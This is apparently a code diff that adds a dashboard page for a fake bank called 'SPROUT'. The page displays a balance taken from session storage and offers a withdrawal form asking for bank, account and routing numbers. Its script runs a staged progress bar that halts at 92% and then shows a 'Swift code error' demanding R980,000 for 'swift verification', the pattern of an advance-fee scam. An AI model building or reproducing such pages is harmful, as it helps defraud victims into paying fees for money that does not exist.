@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="zxx">
+
+<head>
+	<title>SPROUT | Loans | Credit</title>
+	<meta charset="UTF-8">
+	<meta name="description" content="SPROUT | Loans | Credit">
+	<meta name="keywords" content="SPROUT | Loans | Credit">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Favicon -->
+	<link href="img/favicon.ico" rel="shortcut icon" />
+
+	<!-- Google font -->
+	<link
+		href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&display=swap"
+		rel="stylesheet">
+
+	<!-- Stylesheets -->
+	<link rel="stylesheet" href="css/bootstrap.min.css" />
+	<link rel="stylesheet" href="css/font-awesome.min.css" />
+	<link rel="stylesheet" href="css/owl.carousel.min.css" />
+	<link rel="stylesheet" href="css/flaticon.css" />
+	<link rel="stylesheet" href="css/jquery-ui.min.css" />
+	<link rel="stylesheet" href="css/slicknav.min.css" />
+
+	<!-- Main Stylesheets -->
+	<link rel="stylesheet" href="css/style.css" />
+
+
+	<!--[if lt IE 9]>
+		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+	<![endif]-->
+
+</head>
+<style>
+	#myProgress {
+	  width: 100%;
+	  background-color: #ddd;
+	  border-radius: 10px;
+	}
+	
+	#myBar {
+	  width: 1%;
+	  height: 30px;
+	  background-color: #4CAF50;
+	  border-radius: 10px;
+	  text-align: center; /* To center it horizontally (if you want) */
+  line-height: 30px; /* To center it vertically */
+  color: white;
+	}
+	</style>
+<body>
+	<!-- Page Preloder -->
+	<div id="preloder">
+		<div class="loader"></div>
+	</div>
+	<div id="success-message" style="position: fixed; top:50px; width:80%; right:10%;z-index: 10000;text-align: center;"
+		class="alert alert-success myhide">
+
+	</div>
+
+	<!-- Header Section -->
+	<header class="header-section">
+		<a href="index.html" class="site-logo">
+			<!--<img src="img/logo.png" alt="">-->
+			SPR<span class="red">O</span>UT
+		</a>
+		<nav class="header-nav">
+			<ul class="main-menu">
+				<li><a href="index.html" class="active">Home</a></li>
+				<li><a href="about-us.html">About Us</a></li>
+				<!--<li><a href="#">Pages</a>
+					<ul class="sub-menu">
+						<li><a href="about-us.html">About Us</a></li>
+						<li><a href="dashboard.html">Loans</a></li>
+						<li><a href="elements.html">elements</a></li>
+					</ul>
+				</li>
+				<li><a href="news.html">News</a></li>-->
+				<li><a href="contact.html">Contact</a></li>
+			</ul>
+			<div class="header-right">
+				<a href="#" class="hr-btn"><i class="flaticon-029-telephone-1"></i>Call us now! </a>
+				<div class="hr-btn hr-btn-2">+45 332 65767 42</div>
+			</div>
+		</nav>
+	</header>
+	<!-- Header Section end -->
+	<!-- Header Section end -->
+
+	<!-- Page top Section end -->
+	<section class="page-top-section set-bg" data-setbg="img/page-top-bg/2.jpg">
+		<div class="container">
+			<h2>DashBoard</h2>
+			<nav class="site-breadcrumb">
+				<a class="sb-item" href="#">Home</a>
+				<span class="sb-item active">Dashboard</span>
+			</nav>
+		</div>
+	</section>
+	<!-- Page top Section end -->
+
+	<!-- Loans Section end -->
+	<section class="loans-section spad">
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-6">
+					<img id="idcard" src="img/idcard.jpg" width="150px" alt="">
+				</div>
+				<div class="col-lg-6">
+					<div class="loans-text">
+						<h2 id="accountName"></h2>
+						<p>Account Number: <span id="acctnu"></span></p>
+						<ul>
+							<li>ROUTING NUMBER: 241271795</li>
+							<li>ACTIVATED </li>
+						</ul>
+						<a href="#" onclick="logout()" class="site-btn">logout</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<!-- Loans Section end -->
+
+	<!-- Loans calculator Section  -->
+	<section class="loans-calculator-section spad">
+		<div class="container">
+			<div class="text-center text-white mb-5 pb-3">
+				<h2>Account Balance</h2>
+				
+			</div>
+			<div class="loans-calculator">
+				<div id="calc" class="myshow">
+					<h2 id="mainaccount">0</h2>
+					<div id="lc-dec" class="lc-control-btn">-</div>
+					<div id="lc-inc" class="lc-control-btn ici">+</div>
+					<div class="slider-input-warp">
+						<div id="slider-range-max" class="slider">
+							<div class="ui-slider-handle"><span id="loan-value">&#82;0</span></div>
+						</div>
+					</div>
+					<div class="calculator-scale">
+						<span></span>
+						<span></span>
+						<span></span>
+						<span></span>
+						<span></span>
+					</div>
+					<div class="lone-values">
+						<span style="display: none;" id="amountTos">0</span>
+						<div class="lone-value">&#82;0</div>
+						<div class="lone-value lv-step">&#82;<span id="amountTo">0</span></div>
+					</div>
+					<div class="ls-result">Withdraw : <span id="lone-emi">&#82;0</span></div>
+					<!--<p>Info: Pending swift code activation for withdrawal</p>-->
+					<div class="text-center">
+						<button onclick="totansfer()" class="site-btn mr-0 mr-sm-2 mt-4">Withdraw</button>
+						<button class="site-btn sb-dark mt-4">History</button>
+					</div>
+				</div>
+				<div id="withdrawtab" class="myhide">
+					<div id="error-message" style="width:80%;margin: auto;text-align: center;" class="alert alert-warning myhide">
+		
+					</div>
+					<div id="myProgress">
+						<div id="myBar">0%</div>
+					  </div>
+					<form class="hero-form" method="POST" onsubmit="return  move()">
+						
+						<input required id="bankname" type="text" placeholder="Bank Name">
+						<input required id="acctnumber" type="number" placeholder="Account number">
+						<input required id="routingnumber" type="number" placeholder="Routing number">
+						<span id="trancs" class="myshow"><button  class="site-btn ">Transfer</button></span>
+					</form>
+				</div>
+			</div>
+		</div>
+	</section>
+	<!-- Loans calculator Section end -->
+
+
+
+	<!-- Score Section end -->
+	<!--<section class="score-section text-white set-bg" data-setbg="img/score-bg.jpg">
+		<div class="container">
+			<div class="row">
+				<div class="col-xl-6 col-lg-8">
+					<h2>Calculate my Score</h2>
+					<h4>Check your credit reports as often as you want, it won't affect your scores.</h4>
+					<a href="#" class="site-btn sb-big">show my score</a>
+				</div>
+			</div>
+			<img src="img/hand.png" alt="" class="hand-img">
+		</div>
+	</section>-->
+	<!-- Score Section end -->
+
+	<!-- Footer Section -->
+	<footer class="footer-section">
+		<div class="container">
+			<a href="index.html" class="footer-logo">
+				SPR<span class="red">O</span>UT
+			</a>
+			<div class="row">
+				<div class="col-lg-3 col-sm-6">
+					<div class="footer-widget">
+						<h2>What we do</h2>
+						<ul>
+							<li><a href="#">Loans</a></li>
+							<li><a href="#">Car loans</a></li>
+							<li><a href="#">Debt consolidation loans</a></li>
+							<li><a href="#">Home improvement loans</a></li>
+							<li><a href="#"> Wedding loans</a></li>
+							<li><a href="#">Innovative Finance ISA</a></li>
+						</ul>
+					</div>
+				</div>
+				<div class="col-lg-3 col-sm-6">
+					<div class="footer-widget">
+						<h2>About us</h2>
+						<ul>
+							<li><a href="#">About us</a></li>
+							<li><a href="#">Our story</a></li>
+							<li><a href="#">Meet the board</a></li>
+							<li><a href="#">Meet the leadership team</a></li>
+							<li><a href="#">Awards</a></li>
+							<li><a href="#">Careers</a></li>
+						</ul>
+					</div>
+				</div>
+				<div class="col-lg-3 col-sm-6">
+					<div class="footer-widget">
+						<h2>Legal</h2>
+						<ul>
+							<li><a href="#">Privacy policy</a></li>
+							<li><a href="#">sproutbg principles</a></li>
+							<li><a href="#">Website terms</a></li>
+							<li><a href="#">Cookie policy</a></li>
+							<li><a href="#">Conflicts policy</a></li>
+						</ul>
+					</div>
+				</div>
+				<div class="col-lg-3 col-sm-6">
+					<div class="footer-widget">
+						<h2>Site Info</h2>
+						<ul>
+							<li><a href="#">Support</a></li>
+							<li><a href="#">FAQ</a></li>
+							<li><a href="#">Sitemap</a></li>
+							<li><a href="#">Careers</a></li>
+							<li><a href="#">Contact us</a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+			<div class="copyright">
+				<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
+				Copyright &copy;
+				<script>document.write(new Date().getFullYear());</script> All rights reserved <span
+					style="display: none;">| This template is made with <i class="fa fa-heart-o" aria-hidden="true"></i>
+					by <a href="https://colorlib.com" target="_blank">Colorlib</a></span>
+				<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
+			</div>
+		</div>
+	</footer>
+	<!-- Footer Section end -->
+
+	<!--====== Javascripts & Jquery ======-->
+	<script src="js/jquery-3.2.1.min.js"></script>
+	<script src="js/bootstrap.min.js"></script>
+	<script src="js/jquery.slicknav.min.js"></script>
+	<script src="js/owl.carousel.min.js"></script>
+	<script src="js/jquery-ui.min.js"></script>
+	<script>
+		const formatter = new Intl.NumberFormat('en-US', {
+			style: 'currency',
+			currency: 'USD',
+			minimumFractionDigits: 2
+		});
+		var i = 0;
+		function move() {
+			document.getElementById("trancs").classList.replace("myshow", "myhide");
+			if (i == 0) {
+				i = 1;
+				var elem = document.getElementById("myBar");
+				var width = 0;
+				var id = setInterval(frame, 500);
+				function frame() {
+					if (width >= 92) {
+						clearInterval(id);
+						i = 0;
+						showAlert();
+					} else {
+						width++;
+						elem.style.width = width + "%";
+						elem.innerHTML = width + "%";
+					}
+				}
+			}
+			return false;
+		}
+		const showAlert = () => {
+			document.getElementById("error-message").innerHTML = "<strong>Oops!! Swift code error.</strong><br><p> pay R980,000.00 for swift verification to enable withdrawal  </p>  ";
+				document.getElementById("error-message").classList.replace("myhide", "myshow");
+				setTimeout("errorShown()", 8000);
+		}
+		const  errorShown = () => window.location = "dashboard.html";
+		const totansfer = () => {
+			document.getElementById("calc").classList.replace("myshow", "myhide");
+			document.getElementById("withdrawtab").classList.replace("myhide", "myshow");
+		};
+		const logout = () => {
+			sessionStorage.clear();
+			window.location = "index.html";
+		};
+		const titleCase = str => {
+			var splitStr = str.toLowerCase().split(' ');
+			var newName = [];
+			splitStr.forEach(element => {
+				element = element.charAt(0).toUpperCase() + element.substring(1);
+				newName.push(element);
+
+			});
+			return newName.join(' ');
+		}
+		if (sessionStorage.getItem('sproutname')) {
+
+			document.getElementById("accountName").innerHTML = titleCase(sessionStorage.getItem('sproutname'));
+			document.getElementById("acctnu").innerHTML = sessionStorage.getItem('sproutacctnumber');
+			document.getElementById("amountTos").innerHTML = sessionStorage.getItem('sproutbalance');
+			document.getElementById("amountTo").innerHTML = formatter.format(sessionStorage.getItem('sproutbalance')).replace("$", "");
+			document.getElementById("mainaccount").innerHTML = formatter.format(sessionStorage.getItem('sproutbalance')).replace("$", "R");
+			document.getElementById("idcard").setAttribute("src", sessionStorage.getItem('sproutidcard') !== "null" ? sessionStorage.getItem('sproutidcard') : "img/feature-2.jpg")
+
+
+		} else {
+			window.location = "index.html";
+		}
+	</script>
+	<script src="js/main.js"></script>
+
+</body>
+
+</html>
